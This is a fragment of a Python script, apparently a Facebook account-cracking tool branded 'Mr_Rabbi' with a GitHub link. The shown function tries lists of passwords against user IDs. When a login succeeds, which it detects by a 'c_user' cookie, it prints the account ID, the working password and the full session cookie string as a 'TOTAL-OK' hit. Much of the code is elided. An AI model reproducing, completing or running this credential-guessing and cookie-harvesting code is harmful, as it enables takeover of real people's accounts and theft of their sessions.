...
devoloper_info={
    ...
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/Rabbi-islam-vai/Mr-Rabbi.git',
...
def numb():
    ...
    space()
    space()
    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000,50000") 
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mMr_Rabbi on fire\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            Mr_Rabbi=session.cookies.get_dict().keys()
            if "c_user" in Mr_Rabbi:
                hh=str(len(ok))
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                Mr_Rabbi=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{Mr_Rabbi} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{Mr_Rabbi} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
